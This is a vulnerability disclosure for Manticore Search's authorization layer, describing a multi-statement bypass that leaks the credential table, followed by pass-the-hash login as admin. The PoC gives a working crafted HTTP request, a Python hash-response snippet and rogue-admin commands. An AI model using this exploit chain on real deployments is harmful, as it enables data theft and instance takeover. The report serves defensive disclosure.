https://github.com/manticoresoftware/manticoresearch/

## Finding: Per-statement authorization is skipped for every SQL statement after the first in a request, allowing a scoped read-only user to dump the credential store and pass-the-hash into full admin

Affected Versions: all versions with the authentication subsystem (>= 27.0.0, introduced in PR #3648); confirmed on commit 6ca1ba776d166be099b53df7a502254195a5cf31 (built and tested as manticoresearch/manticore:dev-28.3.5-1ca757c, commit 1ca757ce2)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE: CWE-863 - Incorrect Authorization


### Summary

Manticore Search's SQL authorization layer only checks permissions for the first statement of a request. When a client sends several `;`-separated statements in a single SQL request (supported natively by the grammar for `SELECT`/`SHOW`/`SET`/`TOKEN` statements), only the first statement's target table is checked against the caller's permissions; every subsequent statement executes unchecked.

A user who holds `READ` permission on a single, unrelated table can exploit this to read the contents of any other table on the instance, including the two internal tables that store the credential database itself (`system.auth_users`, `system.auth_permissions`). The leaked `password_sha1_no_salt` field is the exact value consumed by the MySQL wire protocol's challenge-response authentication, so an attacker who dumps it can authenticate as the corresponding user (including `admin`) without ever knowing the plaintext password, and from there grant themselves permanent ADMIN rights.

The end-to-end path validated in this report: a caller holding only `READ` on one public table -> reads the entire `system.auth_users` table via the multi-statement bypass -> authenticates as `admin` using the leaked hash (pass-the-hash, no cracking required) -> creates a new user and grants it `ADMIN` on `*`. This is a full, persistent compromise of the instance's access control, reachable over the network from an account that was only ever supposed to have narrow read access.

### Details

The authorization subsystem was added in v27.0.0 (`Added authentication and authorization ... including users, bearer tokens, fine-grained permissions`). It supports five actions (`READ`, `WRITE`, `SCHEMA`, `REPLICATION`, `ADMIN`) scoped per table/target, defined in `src/auth/auth_perms.h`.

For the MySQL/SphinxQL protocol (also reachable over HTTP via `/sql`, `/sql?mode=raw`, `/cli`, `/cli_json`), the entry point is `ClientSession_c::Execute()` in `src/searchd.cpp`:

```cpp
// src/searchd.cpp:11979
CSphVector<SqlStmt_t> dStmt;
bool bParsedOK = sphParseSqlQuery ( sQuery, dStmt, m_sError, tSess.GetCollation () );
...
// src/searchd.cpp:12017
if ( bParsedOK && !SqlCheckPerms ( session::GetUser(), dStmt, m_sError ) )
{
    ...
    tOut.Error ( m_sError.cstr(), EMYSQL_ERR::ACCESS_DENIED_ERROR );
    return true;
}

// handle multi SQL query
if ( bParsedOK && dStmt.GetLength()>1 )
{
    m_sError = "";
    HandleMysqlMultiStmt ( dStmt, m_tLastMeta, tOut, m_sError );
    return true;
}
```

`sphParseSqlQuery()` can return more than one `SqlStmt_t` because the grammar (`src/sphinxql.y`) explicitly allows chaining several statements with `;` in one request:

```
// src/sphinxql.y:232-243
request:
    statement                  { pParser->PushQuery(); }
  | statement ';'              { pParser->PushQuery(); }
  | multi_stmt_list
  | multi_stmt_list ';'
  ;

multi_stmt_list:
    multi_stmt                         { pParser->PushQuery(); }
  | multi_stmt_list ';' multi_stmt     { pParser->PushQuery(); }
  | multi_stmt_list facet_stmt         { pParser->PushQuery(); }
  ;

multi_stmt:
    select
  | show_stmt
  | set_stmt
  | token_stmt
  ;
```

But `SqlCheckPerms()` (src/auth/auth_proto_mysql.cpp:189) only ever looks at the first element:

```cpp
// src/auth/auth_proto_mysql.cpp:189-221
bool SqlCheckPerms ( const CSphString & sUser, const CSphVector<SqlStmt_t> & dStmt, CSphString & sError )
{
    if ( !IsAuthEnabled() )
        return true;

    if ( !dStmt.GetLength() )
        return true;

    const SqlStmt_t & tStmt = dStmt[0];        // <-- only dStmt[0] is ever checked

    switch ( tStmt.m_eStmt )
    {
    ...
    case STMT_SELECT:
    ...
    {
        const CSphString & sTarget = tStmt.m_sIndex.IsEmpty() ? tStmt.m_tQuery.m_sIndexes : tStmt.m_sIndex;
        if ( DenyInternalAuthStorageTarget ( sUser, sTarget, sError ) )
            return false;

        return CheckPerms ( sUser, AuthAction_e::READ, sTarget, false, sError );
    }
    ...
```

`dStmt[1..]` are then executed by `HandleMysqlMultiStmt()` (src/searchd.cpp:8966) with no further authorization call anywhere in that function or in `HandleMysqlSelectStmtGroup()` (src/searchd.cpp:8812), which builds a single `SearchHandler_c` covering every consecutive `SELECT` in the batch and runs them together.

The same first-statement-only check also guards the two internal system tables that back the auth engine itself:

```cpp
// src/auth/auth_proto_mysql.cpp:163-170
static bool DenyInternalAuthStorageTarget ( const CSphString & sUser, const CSphString & sTarget, CSphString & sError )
{
    if ( !strstr ( sTarget.cstr(), GetPrefixAuth().cstr() ) )
        return false;

    sError.SetSprintf ( "Permission denied for user '%s'", sUser.cstr() );
    return true;
}
```
(`GetPrefixAuth()` returns `"system.auth_"`, and `system.auth_users` / `system.auth_permissions` are the dynamic tables backing the credential store -- src/auth/auth_common.cpp:25-27.) Because this guard is only invoked from inside `SqlCheckPerms` on `dStmt[0]`, it is bypassed the same way as any ordinary table when the query is placed at `dStmt[1]` or later.

`system.auth_users` exposes, per user: `username`, `salt`, and a `hashes` JSON object containing `password_sha1_no_salt`, `password_sha256`, and `bearer_sha256` (schema defined in `src/auth/auth.cpp`, `AuthUsersIndex_c`).

`password_sha1_no_salt` is exactly the value the MySQL wire-protocol challenge-response is built from:

```cpp
// src/auth/auth_proto_mysql.cpp:50-68
static bool CheckPwd ( const MySQLAuth_t & tSalt, const AuthUserCred_t & tEntry, const VecTraits_T<BYTE> & dClientHash )
{
    if ( dClientHash.GetLength()!=HASH20_SIZE )
        return false;

    const HASH20_t & tSha1 = tEntry.m_tPwdSha1;                 // = SHA1(password)  <- this is "password_sha1_no_salt"
    HASH20_t tSha2 = CalcBinarySHA1 ( tSha1.data(), tSha1.size() );  // SHA1(SHA1(password))

    SHA1_c tSaltSha2Calc;
    tSaltSha2Calc.Init();
    tSaltSha2Calc.Update ( (const BYTE *)tSalt.m_dScramble.Begin(), tSalt.m_dScramble.GetLength()-1 );
    tSaltSha2Calc.Update ( tSha2.data(), tSha2.size() );
    HASH20_t tSha3 = tSaltSha2Calc.FinalHash();                  // SHA1(scramble || SHA1(SHA1(password)))

    CSphFixedVector<BYTE> dRes ( tSha1.size() );
    Crypt ( dRes.Begin(), tSha3.data(), tSha1.data(), dRes.GetLength() );  // tSha3 XOR tSha1

    return SecretEqual ( dRes, dClientHash );
}
```

This is the standard `mysql_native_password` algorithm. Knowing `tSha1` (i.e. `password_sha1_no_salt`) is sufficient to compute a valid response to any scramble the server issues -- the plaintext password is never needed. Dumping `system.auth_users` is therefore equivalent to a full password compromise for every listed account over the MySQL protocol, including `admin`.

For contrast, the HTTP JSON bulk-write endpoint shows how this should be done: `HttpHandler_JsonBulk_c::Process()` re-checks permissions for every distinct table encountered as it walks the NDJSON batch, not just the first line:

```cpp
// src/searchdhttp.cpp:2291-2293
// Check permissions for every transaction target, but keep same-index bulk lines together.
if ( ( !tTxnState.HasIndex() || tStmt.m_sIndex!=tTxnState.m_sIndex ) && !HttpCheckPerms ( session::GetUser(), AuthAction_e::WRITE, tStmt.m_sIndex, m_eHttpCode, m_sError, m_dData ) )
    return false;
```

`SqlCheckPerms` needs the equivalent: a check per statement (or at minimum, per distinct target) instead of a single check against `dStmt[0]`.

Note on scope: because the grammar only allows `select | show_stmt | set_stmt | token_stmt` to appear as `dStmt[1..]` (write-type statements are part of the mutually exclusive `statement` production and can only ever be `dStmt[0]`, and `HandleMysqlMultiStmt` has no execution case for them regardless), this specific gap does not let an attacker smuggle a second write. It is a read-authorization bypass -- but because "read" includes the entire credential store, it directly yields full write/admin control via pass-the-hash, as shown below.

### PoC

Environment: `manticoresearch/manticore:dev-28.3.5-1ca757c` (commit `1ca757ce2`, 6 commits behind the reviewed HEAD `6ca1ba776`, includes the constant-time-compare fix from GHSA-jhj4-m4q2-46x9), `searchd { auth = 1 }` enabled, bootstrapped with an `admin` account via `searchd --auth-non-interactive`.

Step 1 - set up the victim data and a deliberately narrow account, as `admin`:

```
$ mysql -h127.0.0.1 -P9306 -uadmin -pAdminPass123! -e "
CREATE TABLE public_data(content text);
CREATE TABLE secret_data(content text);
INSERT INTO public_data(content) VALUES ('this is public info, anyone can read it');
INSERT INTO secret_data(content) VALUES ('TOP-SECRET-value-should-not-leak-12345');
CREATE USER 'pubuser' IDENTIFIED BY 'PubPass123!';
GRANT READ ON 'public_data' TO 'pubuser';
"
```

Confirmed scope of `pubuser`:

```
mysql> SHOW PERMISSIONS FOR 'pubuser';  -- run as admin
+----------+--------+-------------+-------+--------+
| username | action | target      | allow | budget |
+----------+--------+-------------+-------+--------+
| pubuser  | read   | public_data | 1     |        |
+----------+--------+-------------+-------+--------+
```

Step 2 - baseline: as `pubuser`, a lone query against `secret_data` is correctly denied:

```
$ mysql -h127.0.0.1 -P9306 -upubuser -pPubPass123! -e "SELECT * FROM secret_data;"
ERROR 1045 (42000) at line 1: Permission denied for user 'pubuser'
```

Step 3 - the bypass: as `pubuser`, one HTTP request containing two `;`-separated `SELECT`s (sent as a single POST body / single `session::Execute()` call, to avoid any client-side statement splitting):

```
$ B64=$(echo -n 'pubuser:PubPass123!' | base64)
$ printf 'POST /sql?mode=raw HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Basic %s\r\nContent-Length: 60\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\nquery=SELECT * FROM public_data; SELECT * FROM secret_data;' "$B64" | nc 127.0.0.1 9308
```

Observed response (both result sets returned, second one is data the account has no permission on):

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8

[{
"columns":[{"id":{"type":"long long"}},{"content":{"type":"string"}}],
"data":[
{"id":1805242856332328961,"content":"this is public info, anyone can read it"}
],
"total":1,"error":"","warning":""
},
{
"columns":[{"id":{"type":"long long"}},{"content":{"type":"string"}}],
"data":[
{"id":1805242856332328962,"content":"TOP-SECRET-value-should-not-leak-12345"}
],
"total":1,"error":"","warning":""
}]
```

`secret_data` was returned even though `pubuser` only has `READ` on `public_data`. The same result was independently reproduced against the plain-text `/cli` endpoint and against a hand-rolled single `COM_QUERY` MySQL-protocol packet, ruling out any HTTP-specific quirk.

Step 4 - escalate: as `pubuser`, dump the internal credential store the same way:

```
$ printf 'POST /sql?mode=raw HTTP/1.1\r\n...\r\n\r\nquery=SELECT * FROM public_data; SELECT * FROM system.auth_users;' | nc 127.0.0.1 9308
```

Response (truncated to the interesting fields):

```
{"username":"admin","salt":"7e465f0b75b2c04c3f93dd88504a0156ee1b8c7e",
 "hashes":"{\"password_sha1_no_salt\":\"bc7d0af48032303599f08bd3942c3cad9768348f\",
            \"password_sha256\":\"ec8bf65caca617ebaa5fd0721737186456b79986cdace799c2c0de7ae24394c0\",
            \"bearer_sha256\":\"\"}"}
{"username":"pubuser", ... }
{"username":"system.buddy", ... "bearer_sha256":"b3a281654797c409a594f13bf694e4615ba0ad0b5e5267effb42887ba0cabe0c" ...}
```

`system.auth_users` is normally hard-blocked for every user by `DenyInternalAuthStorageTarget`; it was returned in full because the check only runs against `dStmt[0]`.

Step 5 - pass-the-hash: authenticate as `admin` using only `password_sha1_no_salt` leaked above, never the plaintext password, by implementing the `mysql_native_password` response directly:

```python
# response = SHA1(password) XOR SHA1(scramble + SHA1(SHA1(password)))
hash1 = bytes.fromhex("bc7d0af48032303599f08bd3942c3cad9768348f")   # leaked hash, NOT the password
hash2 = hashlib.sha1(hash1).digest()
token = hashlib.sha1(scramble + hash2).digest()
response = bytes(a ^ b for a, b in zip(hash1, token))
```

Full runnable client in `scripts/002_poc_pass_the_hash.py`. Observed output:

```
[+] server version: 28.3.5 1ca757ce2@26070207 dev ...
[+] scramble (20 bytes): 4777794250476f534932644d71694846596a4b4c
[+] computed auth response using ONLY the leaked SHA1(password) hash: 21c83adbe4616b607f755e35ec3b55feb0139064
[+] SUCCESS: server returned OK packet -- authenticated as 'admin' using only the leaked hash, no plaintext password was ever used.
```

Step 6 - proof of full compromise: using that hijacked session, create a new persistent admin account:

```
mysql> CREATE USER 'pth_rogue_admin' IDENTIFIED BY 'RogueP4ss!';
Query OK

mysql> GRANT ADMIN ON '*' TO 'pth_rogue_admin';
Query OK
```

Both commands executed successfully over the connection authenticated purely via the leaked hash. The admin account's plaintext password (`AdminPass123!`) was never supplied at any point in steps 5-6.

Full PoC scripts: `scripts/001_poc_multistmt_authz_bypass.sh` (steps 1-4), `scripts/002_poc_pass_the_hash.py` (step 5).

### Impact

Any account with `READ` permission on even a single table (a realistic and common deployment: an API credential scoped to one public search index for a "search-as-a-service" integration) can:

- Read the contents of every other table on the instance, regardless of that account's permission grants.
- Dump the full credential store (`system.auth_users`, `system.auth_permissions`), including every user's salt, unsalted SHA1 password hash, SHA256 password hash, and bearer-token hash.
- Use the unsalted SHA1 hash to authenticate as any user, including `admin`, over the MySQL protocol without ever recovering or guessing the plaintext password.
- From an impersonated admin session, create new users and grant `ADMIN` permission on `*`, obtaining permanent, independent administrative control of the instance -- including the ability to read, modify, or delete any table, alter cluster/replication membership, and manage every other user's credentials and permissions.

This affects any deployment that has enabled the authentication feature (`searchd { auth = 1 }`) intending to give different callers different levels of access -- exactly the multi-tenant / scoped-API-key model the feature exists to support.

---

### Disclosure
 - July 2026 - no security policy; reported via https://github.com/manticoresoftware/manticoresearch/issues/4706
 - August 2026 - issue removed
 - September 2026 - disclosed
